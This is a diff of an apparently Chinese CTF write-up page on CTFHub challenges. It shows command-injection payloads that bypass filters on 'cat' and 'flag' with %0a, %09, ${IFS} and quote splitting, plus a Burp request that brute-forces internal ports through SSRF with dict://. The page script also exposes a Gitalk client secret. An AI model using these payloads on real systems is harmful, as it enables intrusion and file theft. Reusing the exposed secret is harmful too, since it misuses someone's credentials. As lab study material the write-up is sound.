@@ -68,13 +68,11 @@
 <li><a href="#综合练习">综合练习</a></li>
 </ul>
 </li>
-</ul>
-</li>
-<li><a href="#注0a代替换行09代替tab键因为flag被过滤了所以我们通过tab来补全flag_is_here">注：%0a代替换行，%09代替TAB键（因为flag被过滤了，所以我们通过TAB来补全flag_is_here）</a><ul>
 <li><a href="#ssrf">SSRF</a><ul>
 <li><a href="#内网访问">内网访问</a></li>
 <li><a href="#伪协议读取文件">伪协议读取文件</a></li>
 <li><a href="#端口扫描">端口扫描</a></li>
+<li><a href="#post请求">POST请求</a></li>
 </ul>
 </li>
 </ul>
@@ -556,10 +554,12 @@
 <h4><span id="综合练习">综合练习</span></h4><p><a href="https://blog.csdn.net/weixin_45897324/article/details/109271622" target="_blank" rel="noopener">url查看表</a></p>
 <ul>
 <li><p>题解一</p>
-<figure class="highlight plain"><figcaption><span>```代替 换行 ，``` %09 ```代替 TAB键 （因为flag被过滤了，所以我们通过TAB来补全flag_is_here ）```%5c``` 代替 \（用 \ 来分隔开 cat ，因为 cat 也被过滤了qwq）</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这题得在地址栏输入</span><br></pre></td></tr></table></figure>
-<p>?ip=127.0.0.1%0als<br>?ip=127.0.0.1%0als%09<em>is_here<br>? # 查看flag_is_here文件夹下的文件ip=127.0.0.1%0acd%09</em>_is_here%0aca%5ct%09*_98358017212.php</p>
-<h1><span id="注0a代替换行09代替tab键因为flag被过滤了所以我们通过tab来补全flag_is_here">注：%0a代替换行，%09代替TAB键（因为flag被过滤了，所以我们通过TAB来补全flag_is_here）</span></h1><p>　　%5c代替\（用\来分隔开cat，因为cat也被过滤了qwq）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  在f12中能看到答案</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;ls&#96;&#96;&#96;可以接通配\*,比如说ls source可以用ls sour\*，还可以使用ls \*rce</span><br><span class="line"></span><br><span class="line">- 题解二</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;cmd</span><br><span class="line">  127.0.0.1%0als$&#123;IFS&#125;fl$*ag_is_here </span><br><span class="line">  127.0.0.1%0acd$&#123;IFS&#125;fl$ag_is_here%0aca&#39;&#39;t$&#123;IFS&#125;fl$a*g_230191972813921.php # 因为过滤了cat，我们这里使用单引号绕过过滤，如ca&#39;&#39;t 构造payload</span><br></pre></td></tr></table></figure>
+<p>%0a 代替 换行 ，<code>%09</code>代替 TAB键 （因为flag被过滤了，所以我们通过TAB来补全flag_is_here ）<code>%5c</code> 代替 \（用 \ 来分隔开 cat ，因为 cat 也被过滤了qwq）</p>
+<p>这题得在地址栏输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1%0als</span><br><span class="line">?ip&#x3D;127.0.0.1%0als%09*is_here</span><br><span class="line">? # 查看flag_is_here文件夹下的文件ip&#x3D;127.0.0.1%0acd%09*_is_here%0aca%5ct%09*_98358017212.php</span><br><span class="line"># 注：%0a代替换行，%09代替TAB键（因为flag被过滤了，所以我们通过TAB来补全flag_is_here）</span><br><span class="line">　　%5c代替\（用\来分隔开cat，因为cat也被过滤了qwq）</span><br></pre></td></tr></table></figure>
+
+<p>在f12中能看到答案</p>
+<figure class="highlight plain"><figcaption><span>source可以用ls sour\*，还可以使用ls \*rce</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 题解二</span><br><span class="line"></span><br><span class="line">  &#96;&#96;&#96;cmd</span><br><span class="line">  127.0.0.1%0als$&#123;IFS&#125;fl$*ag_is_here </span><br><span class="line">  127.0.0.1%0acd$&#123;IFS&#125;fl$ag_is_here%0aca&#39;&#39;t$&#123;IFS&#125;fl$a*g_230191972813921.php # 因为过滤了cat，我们这里使用单引号绕过过滤，如ca&#39;&#39;t 构造payload</span><br></pre></td></tr></table></figure>
 
 <p>其中<code>&#39;&#39;</code>可以用<code>%27</code>代替，将cat的任意字母包裹。</p>
 </li>
@@ -583,6 +583,14 @@
 <li>考察<code>dict://</code>协议</li>
 </ul>
 <p>使用burp suite进行端口扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?url&#x3D;dict:&#x2F;&#x2F;127.0.0.1:§§ HTTP&#x2F;1.1</span><br><span class="line">Host: challenge-235c64bde60462f1.sandbox.ctfhub.com:10800</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;103.0.0.0 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>然后注入使用数字从8000-9000，步进为1，发现端口<code>8243</code>的数据长度不一致。使用<code>http://</code>访问，<em>http可以忽略</em></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">http://<span class="title">challenge</span>-235<span class="title">c64bde60462f1.sandbox.ctfhub.com</span>:10800/?<span class="title">url</span>=127.0.0.1:8243</span></span><br></pre></td></tr></table></figure>
+
+<h4><span id="post请求">POST请求</span></h4><p><code>CRLF</code>: “\r\n”, windows系统环境下的换行方式</p>
+<p><code>LF</code>: “\n”, Linux系统环境下的换行方式</p>
+<p>在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行curl功能时，进行第二次 URL解码。所以我们需要两次编码</p>
 <h1><span id="reverse">Reverse</span></h1><h1><span id="crypto">Crypto</span></h1><h1><span id="misc">Misc</span></h1></div><div class="tags"><a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a></div><div class="post-nav"><a class="next" href="/2022/12/23/Spring%20Security/">Spring Security</a></div><div id="container"></div><link rel="stylesheet" type="text/css" href="//unpkg.com/gitalk/dist/gitalk.css?v=0.0.0"><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=0.0.0"></script><script type="text/javascript" src="//unpkg.com/gitalk/dist/gitalk.min.js?v=0.0.0"></script><script>var gitalk = new Gitalk({
   clientID: 'd154fff64901622afbb6',
   clientSecret: '5b3f1d58c331b54703e4477e1f8fa1e42e9c1082',
